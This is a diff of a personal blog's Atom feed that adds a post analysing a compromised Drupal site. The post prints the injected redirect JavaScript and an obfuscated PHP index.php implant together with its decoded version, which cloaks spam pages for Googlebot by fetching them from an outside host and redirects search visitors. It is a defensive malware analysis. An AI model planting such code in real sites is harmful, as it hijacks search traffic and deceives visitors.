@@ -1,5 +1,376 @@
 <?xml version="1.0" encoding="utf-8"?>
-<feed xmlns="http://www.w3.org/2005/Atom"><title>limbenjamin - articles</title><link href="https://limbenjamin.com/" rel="alternate"></link><link href="https://limbenjamin.com/feeds/articles.atom.xml" rel="self"></link><id>https://limbenjamin.com/</id><updated>2023-02-15T09:17:00+08:00</updated><entry><title>Total Defense and Falsehoods</title><link href="https://limbenjamin.com/articles/total-defense-and-falsehoods.html" rel="alternate"></link><published>2023-02-15T09:17:00+08:00</published><updated>2023-02-15T09:17:00+08:00</updated><author><name>Benjamin Lim</name></author><id>tag:limbenjamin.com,2023-02-15:/articles/total-defense-and-falsehoods.html</id><summary type="html">&lt;p&gt;As we commemorate Total Defense day, it is poignant to note the link to what is potentially some of the worst falsehoods to be perpetuated in Singapore, contributing in part to the death of thousands of people. The impact is probably greater any recorded use of POFMA to date. An …&lt;/p&gt;</summary><content type="html">&lt;p&gt;As we commemorate Total Defense day, it is poignant to note the link to what is potentially some of the worst falsehoods to be perpetuated in Singapore, contributing in part to the death of thousands of people. The impact is probably greater any recorded use of POFMA to date. An excerpt of the copyrighted article from The Straits Times, 26 January 1942, Page 4 has been reproduced for the purpose of study and research.&lt;/p&gt;
+<feed xmlns="http://www.w3.org/2005/Atom"><title>limbenjamin - articles</title><link href="https://limbenjamin.com/" rel="alternate"></link><link href="https://limbenjamin.com/feeds/articles.atom.xml" rel="self"></link><id>https://limbenjamin.com/</id><updated>2023-03-18T09:03:00+08:00</updated><entry><title>Drupal Redirect Malware</title><link href="https://limbenjamin.com/articles/drupal-redirect-malware.html" rel="alternate"></link><published>2023-03-18T09:03:00+08:00</published><updated>2023-03-18T09:03:00+08:00</updated><author><name>Benjamin Lim</name></author><id>tag:limbenjamin.com,2023-03-18:/articles/drupal-redirect-malware.html</id><summary type="html">&lt;p&gt;Just encountered a rather interesting redirection malware. The first sign that something was wrong was that the search engine results on Google had spammy metadata. This may not be an actual compromise as it could have been caused by issues such as spammers submitting fake sitemaps to Google. While accessing …&lt;/p&gt;</summary><content type="html">&lt;p&gt;Just encountered a rather interesting redirection malware. The first sign that something was wrong was that the search engine results on Google had spammy metadata. This may not be an actual compromise as it could have been caused by issues such as spammers submitting fake sitemaps to Google. While accessing the site, it loaded fine. However, the redirection failed sporadically and I managed to find the following external javascript file embedded onto the site. This was the first sign that the website was truly hacked.  &lt;/p&gt;
+&lt;p&gt;&lt;img alt="image" src="//limbenjamin.com/media/drupal_redirect_malware.png"&gt;&lt;/p&gt;
+&lt;p&gt;I pulled down the javascript file and found that it checked the country code of your IP address and redirected you to www(.)hmbags(.)tw if you happened to have a Taiwan IP. Perhaps the ip-api.com connection timed out occasionally hence giving me the opportunity to catch the redirection happening.  &lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;table class="highlighttable"&gt;&lt;tr&gt;&lt;td class="linenos"&gt;&lt;div class="linenodiv"&gt;&lt;pre&gt;&lt;span class="normal"&gt; 1&lt;/span&gt;
+&lt;span class="normal"&gt; 2&lt;/span&gt;
+&lt;span class="normal"&gt; 3&lt;/span&gt;
+&lt;span class="normal"&gt; 4&lt;/span&gt;
+&lt;span class="normal"&gt; 5&lt;/span&gt;
+&lt;span class="normal"&gt; 6&lt;/span&gt;
+&lt;span class="normal"&gt; 7&lt;/span&gt;
+&lt;span class="normal"&gt; 8&lt;/span&gt;
+&lt;span class="normal"&gt; 9&lt;/span&gt;
+&lt;span class="normal"&gt;10&lt;/span&gt;
+&lt;span class="normal"&gt;11&lt;/span&gt;
+&lt;span class="normal"&gt;12&lt;/span&gt;
+&lt;span class="normal"&gt;13&lt;/span&gt;
+&lt;span class="normal"&gt;14&lt;/span&gt;
+&lt;span class="normal"&gt;15&lt;/span&gt;
+&lt;span class="normal"&gt;16&lt;/span&gt;
+&lt;span class="normal"&gt;17&lt;/span&gt;
+&lt;span class="normal"&gt;18&lt;/span&gt;
+&lt;span class="normal"&gt;19&lt;/span&gt;
+&lt;span class="normal"&gt;20&lt;/span&gt;
+&lt;span class="normal"&gt;21&lt;/span&gt;
+&lt;span class="normal"&gt;22&lt;/span&gt;
+&lt;span class="normal"&gt;23&lt;/span&gt;
+&lt;span class="normal"&gt;24&lt;/span&gt;
+&lt;span class="normal"&gt;25&lt;/span&gt;
+&lt;span class="normal"&gt;26&lt;/span&gt;
+&lt;span class="normal"&gt;27&lt;/span&gt;
+&lt;span class="normal"&gt;28&lt;/span&gt;
+&lt;span class="normal"&gt;29&lt;/span&gt;
+&lt;span class="normal"&gt;30&lt;/span&gt;
+&lt;span class="normal"&gt;31&lt;/span&gt;
+&lt;span class="normal"&gt;32&lt;/span&gt;
+&lt;span class="normal"&gt;33&lt;/span&gt;
+&lt;span class="normal"&gt;34&lt;/span&gt;
+&lt;span class="normal"&gt;35&lt;/span&gt;
+&lt;span class="normal"&gt;36&lt;/span&gt;
+&lt;span class="normal"&gt;37&lt;/span&gt;
+&lt;span class="normal"&gt;38&lt;/span&gt;
+&lt;span class="normal"&gt;39&lt;/span&gt;
+&lt;span class="normal"&gt;40&lt;/span&gt;
+&lt;span class="normal"&gt;41&lt;/span&gt;
+&lt;span class="normal"&gt;42&lt;/span&gt;
+&lt;span class="normal"&gt;43&lt;/span&gt;
+&lt;span class="normal"&gt;44&lt;/span&gt;
+&lt;span class="normal"&gt;45&lt;/span&gt;
+&lt;span class="normal"&gt;46&lt;/span&gt;
+&lt;span class="normal"&gt;47&lt;/span&gt;
+&lt;span class="normal"&gt;48&lt;/span&gt;
+&lt;span class="normal"&gt;49&lt;/span&gt;
+&lt;span class="normal"&gt;50&lt;/span&gt;
+&lt;span class="normal"&gt;51&lt;/span&gt;
+&lt;span class="normal"&gt;52&lt;/span&gt;
+&lt;span class="normal"&gt;53&lt;/span&gt;
+&lt;span class="normal"&gt;54&lt;/span&gt;
+&lt;span class="normal"&gt;55&lt;/span&gt;
+&lt;span class="normal"&gt;56&lt;/span&gt;
+&lt;span class="normal"&gt;57&lt;/span&gt;
+&lt;span class="normal"&gt;58&lt;/span&gt;
+&lt;span class="normal"&gt;59&lt;/span&gt;
+&lt;span class="normal"&gt;60&lt;/span&gt;
+&lt;span class="normal"&gt;61&lt;/span&gt;
+&lt;span class="normal"&gt;62&lt;/span&gt;
+&lt;span class="normal"&gt;63&lt;/span&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/td&gt;&lt;td class="code"&gt;&lt;div&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;    function ajax(options) {
+        options = options || {};
+        options.type = (options.type || &amp;quot;GET&amp;quot;).toUpperCase();
+        options.dataType = options.dataType || &amp;quot;json&amp;quot;;
+        var params = formatParams(options.data);
+        var xhr;
+        if (window.XMLHttpRequest) {
+            xhr = new XMLHttpRequest();
+        } else if (window.ActiveObject) {
+            xhr = new ActiveXobject(&amp;#39;Microsoft.XMLHTTP&amp;#39;);
+        }
+        if (options.type == &amp;quot;GET&amp;quot;) {
+            xhr.open(&amp;quot;GET&amp;quot;, options.url, true);
+            xhr.send(null);
+        } else if (options.type == &amp;quot;POST&amp;quot;) {
+            xhr.open(&amp;quot;post&amp;quot;, options.url, true);
+            xhr.setRequestHeader(&amp;quot;Content-type&amp;quot;, &amp;quot;application/x-www-form-urlencoded&amp;quot;);
+            xhr.send(params);
+        }
+        setTimeout(function() {
+            if (xhr.readySate != 4) {
+                xhr.abort();
+            }
+        }, options.timeout)
+        xhr.onreadystatechange = function() {
+            if (xhr.readyState == 4) {
+                var status = xhr.status;
+                if (status &amp;gt;= 200 &amp;amp;&amp;amp; status &amp;lt; 300 || status == 304) {
+                    options.success &amp;amp;&amp;amp; options.success(xhr.responseText, xhr.responseXML);
+                } else {
+                    options.error &amp;amp;&amp;amp; options.error(status);
+                }
+            }
+        }
+    }
+
+    function formatParams(data) {
+        var arr = [];
+        for (var name in data) {
+            arr.push(encodeURIComponent(name) + &amp;quot;=&amp;quot; + encodeURIComponent(data[name]));
+        }
+        arr.push((&amp;quot;v=&amp;quot; + Math.random()).replace(&amp;quot;.&amp;quot;, &amp;quot;&amp;quot;));
+        return arr.join(&amp;quot;&amp;amp;&amp;quot;);
+    }
+    ajax({
+        url: &amp;quot;https://pro.ip-api.com/json?key=FMjb5N6z7rcJ8yt&amp;quot;,
+        type: &amp;#39;get&amp;#39;,
+        dataType: &amp;#39;json&amp;#39;,
+        timeout: 10000,
+        contentType: &amp;quot;application/json&amp;quot;,
+        success: function(data) {
+            var location = JSON.parse(data);
+            if (location.countryCode === &amp;quot;TW&amp;quot;) {
+                window.location.href = &amp;quot;https :// www. hmbags . tw /&amp;quot;;
+            } else {
+                window.location.href = &amp;quot;&amp;quot;;
+            }
+            console.log(JSON.parse(data));
+        },
+        error: function(e) {
+            console.log(e);
+        }
+    })
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/div&gt;
+
+&lt;p&gt;Inspecting the contents of hmbags(.)tw on VirusTotal revealed that it is indeed responsible for the spammy content.  &lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;table class="highlighttable"&gt;&lt;tr&gt;&lt;td class="linenos"&gt;&lt;div class="linenodiv"&gt;&lt;pre&gt;&lt;span class="normal"&gt;1&lt;/span&gt;
+&lt;span class="normal"&gt;2&lt;/span&gt;
+&lt;span class="normal"&gt;3&lt;/span&gt;
+&lt;span class="normal"&gt;4&lt;/span&gt;
+&lt;span class="normal"&gt;5&lt;/span&gt;
+&lt;span class="normal"&gt;6&lt;/span&gt;
+&lt;span class="normal"&gt;7&lt;/span&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/td&gt;&lt;td class="code"&gt;&lt;div&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;威而鋼
+
+美國原廠正品威而鋼viagra·複燃男人的希望. 【鄭重聲明】 本站商品出貨包裝絕對隱秘，不會出現任何敏感的字眼！ 威而鋼官方logo.
+樂威壯(Levitra)效果明顯免處方為什麼男人會陽痿？
+
+性欲是男性勃起機制中的關鍵。性慾強度影響男性荷爾蒙的分泌。而男性荷爾蒙誘使腦部釋放神經傳導物質向下傳導到脊髓的副交感神經核。再經陰莖海綿體神經的神經末梢及 ...
+Rating: 5 · ‎1 review · ‎NT$1,480.00
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/div&gt;
+
+&lt;p&gt;Having confirmed that the website was indeed hacked, I was given access to the Drupal installation and tasked to clean up. Having cPanel access would have made it easier but Drupal does have modules available to perform file management. A little while later, I found the file which was modified (index.php) and managed to clean out the code. The attacker inserted an additional function which was decoded to reveal the following functions.  &lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;table class="highlighttable"&gt;&lt;tr&gt;&lt;td class="linenos"&gt;&lt;div class="linenodiv"&gt;&lt;pre&gt;&lt;span class="normal"&gt;  1&lt;/span&gt;
+&lt;span class="normal"&gt;  2&lt;/span&gt;
+&lt;span class="normal"&gt;  3&lt;/span&gt;
+&lt;span class="normal"&gt;  4&lt;/span&gt;
+&lt;span class="normal"&gt;  5&lt;/span&gt;
+&lt;span class="normal"&gt;  6&lt;/span&gt;
+&lt;span class="normal"&gt;  7&lt;/span&gt;
+&lt;span class="normal"&gt;  8&lt;/span&gt;
+&lt;span class="normal"&gt;  9&lt;/span&gt;
+&lt;span class="normal"&gt; 10&lt;/span&gt;
+&lt;span class="normal"&gt; 11&lt;/span&gt;
+&lt;span class="normal"&gt; 12&lt;/span&gt;
+&lt;span class="normal"&gt; 13&lt;/span&gt;
+&lt;span class="normal"&gt; 14&lt;/span&gt;
+&lt;span class="normal"&gt; 15&lt;/span&gt;
+&lt;span class="normal"&gt; 16&lt;/span&gt;
+&lt;span class="normal"&gt; 17&lt;/span&gt;
+&lt;span class="normal"&gt; 18&lt;/span&gt;
+&lt;span class="normal"&gt; 19&lt;/span&gt;
+&lt;span class="normal"&gt; 20&lt;/span&gt;
+&lt;span class="normal"&gt; 21&lt;/span&gt;
+&lt;span class="normal"&gt; 22&lt;/span&gt;
+&lt;span class="normal"&gt; 23&lt;/span&gt;
+&lt;span class="normal"&gt; 24&lt;/span&gt;
+&lt;span class="normal"&gt; 25&lt;/span&gt;
+&lt;span class="normal"&gt; 26&lt;/span&gt;
+&lt;span class="normal"&gt; 27&lt;/span&gt;
+&lt;span class="normal"&gt; 28&lt;/span&gt;
+&lt;span class="normal"&gt; 29&lt;/span&gt;
+&lt;span class="normal"&gt; 30&lt;/span&gt;
+&lt;span class="normal"&gt; 31&lt;/span&gt;
+&lt;span class="normal"&gt; 32&lt;/span&gt;
+&lt;span class="normal"&gt; 33&lt;/span&gt;
+&lt;span class="normal"&gt; 34&lt;/span&gt;
+&lt;span class="normal"&gt; 35&lt;/span&gt;
+&lt;span class="normal"&gt; 36&lt;/span&gt;
+&lt;span class="normal"&gt; 37&lt;/span&gt;
+&lt;span class="normal"&gt; 38&lt;/span&gt;
+&lt;span class="normal"&gt; 39&lt;/span&gt;
+&lt;span class="normal"&gt; 40&lt;/span&gt;
+&lt;span class="normal"&gt; 41&lt;/span&gt;
+&lt;span class="normal"&gt; 42&lt;/span&gt;
+&lt;span class="normal"&gt; 43&lt;/span&gt;
+&lt;span class="normal"&gt; 44&lt;/span&gt;
+&lt;span class="normal"&gt; 45&lt;/span&gt;
+&lt;span class="normal"&gt; 46&lt;/span&gt;
+&lt;span class="normal"&gt; 47&lt;/span&gt;
+&lt;span class="normal"&gt; 48&lt;/span&gt;
+&lt;span class="normal"&gt; 49&lt;/span&gt;
+&lt;span class="normal"&gt; 50&lt;/span&gt;
+&lt;span class="normal"&gt; 51&lt;/span&gt;
+&lt;span class="normal"&gt; 52&lt;/span&gt;
+&lt;span class="normal"&gt; 53&lt;/span&gt;
+&lt;span class="normal"&gt; 54&lt;/span&gt;
+&lt;span class="normal"&gt; 55&lt;/span&gt;
+&lt;span class="normal"&gt; 56&lt;/span&gt;
+&lt;span class="normal"&gt; 57&lt;/span&gt;
+&lt;span class="normal"&gt; 58&lt;/span&gt;
+&lt;span class="normal"&gt; 59&lt;/span&gt;
+&lt;span class="normal"&gt; 60&lt;/span&gt;
+&lt;span class="normal"&gt; 61&lt;/span&gt;
+&lt;span class="normal"&gt; 62&lt;/span&gt;
+&lt;span class="normal"&gt; 63&lt;/span&gt;
+&lt;span class="normal"&gt; 64&lt;/span&gt;
+&lt;span class="normal"&gt; 65&lt;/span&gt;
+&lt;span class="normal"&gt; 66&lt;/span&gt;
+&lt;span class="normal"&gt; 67&lt;/span&gt;
+&lt;span class="normal"&gt; 68&lt;/span&gt;
+&lt;span class="normal"&gt; 69&lt;/span&gt;
+&lt;span class="normal"&gt; 70&lt;/span&gt;
+&lt;span class="normal"&gt; 71&lt;/span&gt;
+&lt;span class="normal"&gt; 72&lt;/span&gt;
+&lt;span class="normal"&gt; 73&lt;/span&gt;
+&lt;span class="normal"&gt; 74&lt;/span&gt;
+&lt;span class="normal"&gt; 75&lt;/span&gt;
+&lt;span class="normal"&gt; 76&lt;/span&gt;
+&lt;span class="normal"&gt; 77&lt;/span&gt;
+&lt;span class="normal"&gt; 78&lt;/span&gt;
+&lt;span class="normal"&gt; 79&lt;/span&gt;
+&lt;span class="normal"&gt; 80&lt;/span&gt;
+&lt;span class="normal"&gt; 81&lt;/span&gt;
+&lt;span class="normal"&gt; 82&lt;/span&gt;
+&lt;span class="normal"&gt; 83&lt;/span&gt;
+&lt;span class="normal"&gt; 84&lt;/span&gt;
+&lt;span class="normal"&gt; 85&lt;/span&gt;
+&lt;span class="normal"&gt; 86&lt;/span&gt;
+&lt;span class="normal"&gt; 87&lt;/span&gt;
+&lt;span class="normal"&gt; 88&lt;/span&gt;
+&lt;span class="normal"&gt; 89&lt;/span&gt;
+&lt;span class="normal"&gt; 90&lt;/span&gt;
+&lt;span class="normal"&gt; 91&lt;/span&gt;
+&lt;span class="normal"&gt; 92&lt;/span&gt;
+&lt;span class="normal"&gt; 93&lt;/span&gt;
+&lt;span class="normal"&gt; 94&lt;/span&gt;
+&lt;span class="normal"&gt; 95&lt;/span&gt;
+&lt;span class="normal"&gt; 96&lt;/span&gt;
+&lt;span class="normal"&gt; 97&lt;/span&gt;
+&lt;span class="normal"&gt; 98&lt;/span&gt;
+&lt;span class="normal"&gt; 99&lt;/span&gt;
+&lt;span class="normal"&gt;100&lt;/span&gt;
+&lt;span class="normal"&gt;101&lt;/span&gt;
+&lt;span class="normal"&gt;102&lt;/span&gt;
+&lt;span class="normal"&gt;103&lt;/span&gt;
+&lt;span class="normal"&gt;104&lt;/span&gt;
+&lt;span class="normal"&gt;105&lt;/span&gt;
+&lt;span class="normal"&gt;106&lt;/span&gt;
+&lt;span class="normal"&gt;107&lt;/span&gt;
+&lt;span class="normal"&gt;108&lt;/span&gt;
+&lt;span class="normal"&gt;109&lt;/span&gt;
+&lt;span class="normal"&gt;110&lt;/span&gt;
+&lt;span class="normal"&gt;111&lt;/span&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/td&gt;&lt;td class="code"&gt;&lt;div&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&amp;lt;?php function yYVg($aQt)
+{ 
+$aQt=gzinflate(base64_decode($aQt));
+ for($i=0;$i&amp;lt;strlen($aQt);$i++)
+ {
+$aQt[$i] = chr(ord($aQt[$i])-1);
+ }
+ return $aQt;
+ }eval(yYVg(&amp;quot;7ZZtb+o2FIC/k1/hRWhOVJpAt3VbuekVatNbJFpYCHebJhS5wTTuDXHkmALj9rfv2OGtjI57P2yfhiLinJw3P8c+DkL6Z1AhuIgEzbmQLHu06nbTKKiMJJvQKGUTJrWo+okuPFSN+n7w0Q/+MG/DsBcN4ClqffDvQ3MIKg9ceqyIipyNqLCUkaBjJYEbFVREBSUiTvSbhBcyysiEIg+ZiZT5heuazsY/1v5vu/0QD3ekvdsejDs3WIV7mk7ymI+oZ74rYsFyieQipx6WdC7dJ/JMSilGhYg9rGIUEGQ2mzlxQviC5ST+5MR84srZgnDnqcCX79zS5tJsGmxsbQMH/i8Dvx9Gg6CNh57nma5pG0vAhxDoFVLkvLAUoxp+5Pwxpdj+xvPGJC2oDTpLzboaXgMC8UyFZ67TmbPMmZH8+VlnAmErAK0AKPFUpN2cZtbWynkjH8d0WTaicydP8vcKrAckN4Ad89sRnxCWebt8y3t037rz8RAKUkkoUVUzr3gmaSZPQ2B5gTTLRE7SJgJoAhaGN5Xj059MZULjhCOVLoxHjKq6IvRiaCoIUZi7HiyNCtKY9HLwGrZ+BunKwbqO4GXtRiloT+r/xVCudjAfplBDuEh4jm0E5JFG//nzUZOHlD9+pUku+Ggay12rf2MtZJQtqCrp/4vi4KIYT7NYMp4dgmIjKAhoVuPkbIUtYhm0MrupxPoZ0ua5tJRKDV0Ngk63p9B1aug/gfvPeaj2d+u3rv2ghogQZGHh305vusGvreDav1aji/Nz5+z7n50fv3POGg1cw1edNjTi03Zv7419NNYqTrlCjyj3+50IptG++b3n7xh9oY1q6F9mE/jhILgPg9Z9/0bFaRxLLPBBDzTx6jBRfb7cfmo34aOFh/Lok6yG7/ifLE2J+4NTP7HANieSPaS0efJBu4NTzj1zGs2Tk4ORXHjvqM1hH40Ztu/87iCsnddLzWpcbrP1To/onMbaZsdTnPKC7ggFlVORbW1BuLM3do5jY6naiMw+ktSrw26SYmFU1IarFhF5BFMPGmg5usAOtDHJUz4Dy71DeXvolz2iAhcbo03jW/mARrnufpd1UKlsO+tW4wG+OICXUoEGoLPZ5NhQvl8MdcVExgmy/HlMcz2t6sxegnw999KiCRN/NfP9z443CUAbYgWUyNr7vlmtKXNob7PbuEWa1+rhDWL7btSUNLA9Yisvf2P2CtpWSWHTKujI77D5giScr5mX03pNXTH/avTvL/8C&amp;quot;));?&amp;gt;
+
+### decoded version ###
+
+error_reporting(0);
+set_time_limit(0);
+$key= $_SERVER[&amp;quot;HTTP_USER_AGENT&amp;quot;];
+$bot=is_spider();
+$ref=is_referer_search();
+$host_name = &amp;quot;http://&amp;quot;.$_SERVER[&amp;#39;HTTP_HOST&amp;#39;].$_SERVER[&amp;#39;PHP_SELF&amp;#39;];
+$jumpcode=&amp;quot;&amp;lt;script type=&amp;#39;text/javascript&amp;#39; src=&amp;#39;https://www.chaoyipack.com/twyao.js&amp;#39;&amp;gt;&amp;lt;/script&amp;gt;&amp;quot;;
+if($_SERVER[&amp;#39;REQUEST_URI&amp;#39;]===&amp;quot;/&amp;quot;)
+{  
+  if(strpos($key,&amp;#39;google&amp;#39;)!==false)
+  {     $TD_server=&amp;quot;https://xin.wapvv.com/&amp;quot;;
+    $res = curlOpen($TD_server.$_SERVER[&amp;#39;REQUEST_URI&amp;#39;].&amp;quot;/index.php?host=&amp;quot;.$host_name.&amp;quot;&amp;amp;domain=&amp;quot;.$_SERVER[&amp;#39;SERVER_NAME&amp;#39;]);
+    header(&amp;quot;Content-Type: text/html; charset=utf-8&amp;quot;);
+    echo $res;
+    die();
+  }
+
+    else
+    {
+       if($ref==1)
+       {
+        echo $jumpcode;
+        die();
+        }
+    }
+}
+elseif(strpos($_SERVER[&amp;#39;REQUEST_URI&amp;#39;], &amp;#39;shop&amp;#39;) !== false||strpos($_SERVER[&amp;#39;REQUEST_URI&amp;#39;], &amp;#39;blog&amp;#39;) !== false||strpos($_SERVER[&amp;#39;REQUEST_URI&amp;#39;], &amp;#39;product&amp;#39;) !== false)
+{  
+  if(strpos($key,&amp;#39;google&amp;#39;)!==false)
+  {     $TD_server=&amp;quot;https://xin.wapvv.com/neiye.php&amp;quot;;
+    $res = curlOpen($TD_server.$_SERVER[&amp;#39;REQUEST_URI&amp;#39;].&amp;quot;/index.php?host=&amp;quot;.$host_name.&amp;quot;&amp;amp;domain=&amp;quot;.$_SERVER[&amp;#39;SERVER_NAME&amp;#39;]);
+    header(&amp;quot;Content-Type: text/html; charset=utf-8&amp;quot;);
+    echo $res;
+    die();
+  }
+
+    else
+    {
+       if($ref==1)
+       {
+        echo $jumpcode;
+        die();
+        }
+    }
+}
+function curlOpen($TD_server) 
+{ 
+  $ch2 = curl_init(); 
+  curl_setopt($ch2, CURLOPT_URL, $TD_server.$_SERVER[&amp;#39;REQUEST_URI&amp;#39;].&amp;quot;/index.php?host=&amp;quot;.$host_name.&amp;quot;&amp;amp;domain=&amp;quot;.$_SERVER[&amp;#39;SERVER_NAME&amp;#39;]); 
+  curl_setopt($ch2, CURLOPT_HTTPHEADER, array(&amp;#39;X-FORWARDED-FOR:66.249.73.211&amp;#39;,&amp;#39;CLIENT-IP:66.249.73.211&amp;#39;)); 
+  curl_setopt($ch2, CURLOPT_HEADER, false); 
+  curl_setopt($ch2, CURLOPT_SSL_VERIFYPEER, false);
+  curl_setopt($ch2, CURLOPT_SSL_VERIFYHOST, false);
+  curl_setopt($ch2, CURLOPT_RETURNTRANSFER, 1); 
+  curl_setopt($ch2, CURLOPT_REFERER,&amp;#39;http://www.google.com&amp;#39;); 
+  curl_setopt($ch2, CURLOPT_USERAGENT,&amp;#39;Mozilla/5.0+(compatible;+Googlebot/2.1;++http://www.google.com/bot.html)&amp;#39;); 
+  curl_setopt($ch2, CURLOPT_TIMEOUT,60); 
+  $contents = curl_exec($ch2); 
+  curl_close($ch2); 
+  return $contents; 
+}
+function is_spider()
+{
+    $rtnVal=0;
+    try
+    {
+        $s_agent= &amp;#39;s_agent:&amp;#39;.strtolower($_SERVER[&amp;#39;HTTP_USER_AGENT&amp;#39;]);
+
+        if (strpos($s_agent, &amp;#39;google&amp;#39;)&amp;gt;0
+            ||strpos($s_agent, &amp;#39;bingbot&amp;#39;)&amp;gt;0)
+        {
+            $rtnVal=1;
+        }
+    }
+    catch (Exception $w){}
+    return $rtnVal;
+}
+
+function is_referer_search()
+{
+    $rtnVal=0;
+    try
+    {
+        if(isset($_SERVER[&amp;quot;HTTP_REFERER&amp;quot;]))
+        {
+            $s_referer = &amp;#39;s_referer:&amp;#39;.strtolower($_SERVER[&amp;quot;HTTP_REFERER&amp;quot;]);
+
+            if (strpos($s_referer, &amp;#39;google&amp;#39;)&amp;gt;0
+                ||strpos($s_referer, &amp;#39;bing&amp;#39;)&amp;gt;0
+                                ||strpos($s_referer, &amp;#39;yahoo&amp;#39;)&amp;gt;0)
+            {
+                $rtnVal=1;
+            }
+        }
+    }
+    catch (Exception $w){}
+    return $rtnVal;
+}
+?&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/div&gt;
+
+&lt;p&gt;In summary, if Google was crawling the homepage, the contents of &lt;code&gt;https://xin(.)wapvv(.)com/&lt;/code&gt; would be served which contains the same spammy content earlier seen on &lt;code&gt;www(.)hmbags(.)tw&lt;/code&gt;. If Google was crawling any URL with shop/blog/product, &lt;code&gt;https://xin(.)wapvv(.)com/neiye.php&lt;/code&gt; would be served instead. This explains the hijacked search results. A normal visitor would be served the twyao(.)js javascript file. The javascript file will redirect users from Taiwan to the &lt;code&gt;www(.)hmbags(.)tw&lt;/code&gt; website.  &lt;/p&gt;
+&lt;p&gt;Note: if you are following through the code, the &lt;code&gt;is_spider()&lt;/code&gt; and &lt;code&gt;is_referer_search()&lt;/code&gt; is superfluous code which have no effect on the outcome.  &lt;/p&gt;</content><category term="articles"></category><category term="Security"></category></entry><entry><title>Total Defense and Falsehoods</title><link href="https://limbenjamin.com/articles/total-defense-and-falsehoods.html" rel="alternate"></link><published>2023-02-15T09:17:00+08:00</published><updated>2023-02-15T09:17:00+08:00</updated><author><name>Benjamin Lim</name></author><id>tag:limbenjamin.com,2023-02-15:/articles/total-defense-and-falsehoods.html</id><summary type="html">&lt;p&gt;As we commemorate Total Defense day, it is poignant to note the link to what is potentially some of the worst falsehoods to be perpetuated in Singapore, contributing in part to the death of thousands of people. The impact is probably greater any recorded use of POFMA to date. An …&lt;/p&gt;</summary><content type="html">&lt;p&gt;As we commemorate Total Defense day, it is poignant to note the link to what is potentially some of the worst falsehoods to be perpetuated in Singapore, contributing in part to the death of thousands of people. The impact is probably greater any recorded use of POFMA to date. An excerpt of the copyrighted article from The Straits Times, 26 January 1942, Page 4 has been reproduced for the purpose of study and research.&lt;/p&gt;
 &lt;p&gt;&lt;img alt="image" src="//limbenjamin.com/media/london_confidence_singapore_defense.png"&gt;&lt;/p&gt;
 &lt;div class="highlight"&gt;&lt;table class="highlighttable"&gt;&lt;tr&gt;&lt;td class="linenos"&gt;&lt;div class="linenodiv"&gt;&lt;pre&gt;&lt;span class="normal"&gt;1&lt;/span&gt;
 &lt;span class="normal"&gt;2&lt;/span&gt;
